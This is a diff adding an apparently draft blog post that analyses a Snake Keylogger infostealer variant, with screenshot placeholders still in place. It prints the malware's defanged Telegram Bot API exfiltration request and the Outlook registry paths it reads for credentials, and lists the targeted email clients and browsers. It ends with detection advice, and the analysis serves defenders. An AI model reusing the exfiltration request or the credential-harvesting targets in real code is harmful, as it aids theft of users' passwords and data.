@@ -1,0 +1,153 @@
+---
+layout: post
+title: "Latest Snake Keylogger Variant Infostealer Campaign"
+subtitle: "Unpacking a .NET-compiled Snake Keylogger variant that steals browser and email credentials while communicating via Telegram API"
+date: 2025-07-31 16:30:00 +0800
+background: '/img/posts/bg-about.jpg'
+---
+
+<h2>Introduction</h2>
+
+<p>A new variant of <strong>Snake Keylogger</strong> has emerged in the wild—this time compiled in <strong>.NET</strong> and featuring enhanced data-stealing capabilities. Known for its modular structure and stealth, Snake Keylogger continues to evolve by expanding its browser coverage and adopting creative command-and-control (C2) mechanisms such as <strong>Telegram’s Bot API</strong>.</p>
+
+<p>This variant can extract a wide range of sensitive data, including <strong>saved passwords, autofill entries, payment card details, and browser history</strong>, across both Chromium and Gecko-based browsers. It also targets popular email clients like Outlook and Thunderbird by reading credentials from registry keys and application profiles.</p>
+
+<p>In this post, we’ll dissect the technical behavior of this sample, internally named <code>Remington.exe</code>, and explain how it gathers system information, kills browser processes, and exfiltrates user data.</p>
+
+<h2 class="section-heading">Technical Analysis</h2>
+
+<p>The sample is a <strong>.NET compiled executable</strong> posing as a benign application. It uses the filename <code>Remington.exe</code> and begins execution by performing local system reconnaissance before establishing outbound communication.</p>
+
+<p><em><Placeholder for screenshot of file properties></em></p>
+
+<h3>Stage 1: System Recon and Telegram C2</h3>
+
+<p>Immediately upon execution, the malware collects the following details:</p>
+<ul>
+  <li>PC name</li>
+  <li>System date and time</li>
+  <li>Geolocation (via system locale or IP)</li>
+</ul>
+
+<p>It sends the stolen information to the attacker via Telegram’s API using a specially crafted GET request:</p>
+
+<code>hxxps://api[.]telegram[.]org/bot/sendMessage?chat_id=&lt;BOT_CHAT_ID&gt;&amp;text=%0D%0A%0D%0APC%20Name:%20[PC_NAME]%0D%0ADate%20and%20Time:%20[TIMESTAMP]%0D%0ACountry%20Name:%20[COUNTRY]%0D%0A[%20[PC_NAME]%20Clicked%20on%20the%20File.%20If%20you%20see%20nothing,%20this%20means%20the%20system%20storage%20is%20empty.%20]</code>
+
+<p>This simple yet effective communication mechanism allows attackers to monitor infections in real-time without requiring their own backend infrastructure.</p>
+
+<p><em><Placeholder for traffic capture screenshot></em></p>
+
+<h3>Stage 2: Browser Process Termination</h3>
+
+<p>To prepare for data theft, the malware scans for active browser processes and forcefully terminates the following:</p>
+
+<ul>
+  <li>chrome.exe</li>
+  <li>msedge.exe</li>
+  <li>firefox.exe</li>
+  <li>brave.exe</li>
+</ul>
+
+<p>This ensures exclusive access to local storage files such as <code>Login Data</code> and <code>Cookies</code>, which are typically locked while the browser is running.</p>
+
+<p><em><Placeholder for screenshot of the process termination code></em></p>
+
+<h3>Stage 3: Outlook Registry Credential Harvesting</h3>
+
+<p>Snake Keylogger proceeds to search for credentials stored in Microsoft Outlook profiles. It reads several registry paths to collect stored email configuration and login data:</p>
+
+<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\
+HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\
+HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\
+HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\
+</code></pre>
+
+<p>The gathered data is then concatenated into a predefined message format and sent to the attacker.</p>
+
+<p><em><Placeholder for code screenshot showing registry access and data formatting></em></p>
+
+<h3>Stage 4: Email Client Credential Theft</h3>
+
+<p>Besides Outlook, the malware also attempts to extract credentials from other email clients. The targeted applications include:</p>
+
+<ul>
+  <li>FoxMail</li>
+  <li>Thunderbird</li>
+  <li>PostboxApp</li>
+</ul>
+
+<p>It locates configuration files or registry entries specific to these applications to extract saved login credentials for IMAP, SMTP, or POP3 accounts.</p>
+
+<p><em><Placeholder for screenshot showing code that targets these applications></em></p>
+
+<h3>Stage 5: Browser Data Harvesting</h3>
+
+<p>With all browsers previously terminated, the malware now accesses and decrypts browser data from the following categories:</p>
+
+<ul>
+  <li>Saved login credentials (from <code>Login Data</code>)</li>
+  <li>Autofill information (addresses, phone numbers, etc.)</li>
+  <li>Payment/card details</li>
+  <li>Browsing history and visit frequency</li>
+  <li>Top visited websites</li>
+  <li>Download history</li>
+</ul>
+
+<h4>Targeted Browsers:</h4>
+
+<p>This variant supports a vast range of Chromium- and Gecko-based browsers including:</p>
+
+<div class="row">
+  <div class="col-md-6">
+    <ul>
+      <li>Google Chrome</li>
+      <li>Microsoft Edge</li>
+      <li>Brave</li>
+      <li>Opera</li>
+      <li>Vivaldi</li>
+      <li>CocCoc Browser</li>
+      <li>QQ Browser</li>
+      <li>Orbitum</li>
+      <li>Amigo</li>
+      <li>Kometa</li>
+      <li>Nichrome</li>
+      <li>SlimJet</li>
+      <li>Iridium</li>
+      <li>Cent Browser</li>
+      <li>Ghost Browser</li>
+      <li>Chromium</li>
+    </ul>
+  </div>
+  <div class="col-md-6">
+    <ul>
+      <li>Firefox</li>
+      <li>SeaMonkey</li>
+      <li>PaleMoon</li>
+      <li>WaterFox</li>
+      <li>IceDragon</li>
+      <li>CyberFox</li>
+      <li>Epic Browser</li>
+      <li>UC Browser</li>
+      <li>Comodo Dragon</li>
+      <li>Torch</li>
+      <li>CoolNovo</li>
+      <li>360 Browser</li>
+      <li>7Star</li>
+      <li>Sleipnir</li>
+      <li>Sputnik</li>
+      <li>Blisk</li>
+    </ul>
+  </div>
+</div>
+
+<p><em><Placeholder for screenshot showing data harvesting code></em></p>
+
+<h2 class="section-heading">Conclusion</h2>
+
+<p>This Snake Keylogger variant exemplifies how modern infostealers continue to evolve. Through a combination of stealth, broad compatibility, and clever use of public infrastructure like Telegram, it is capable of stealing a wide variety of user data with minimal detection.</p>
+
+<p>Its behavior—from forcibly killing browser processes, to registry parsing, to stealing credentials across dozens of applications—demonstrates the increasing sophistication of malware campaigns in the wild.</p>
+
+<p><strong>Security teams</strong> should monitor outbound connections to <code>api.telegram.org</code>, look for unusual browser process terminations, and inspect systems for unauthorized access to browser data storage paths and registry keys.</p>
+
+<p>🧪 For threat hunters, detection rules based on process access to Outlook registry hives or access to multiple browser login databases may prove useful.</p>
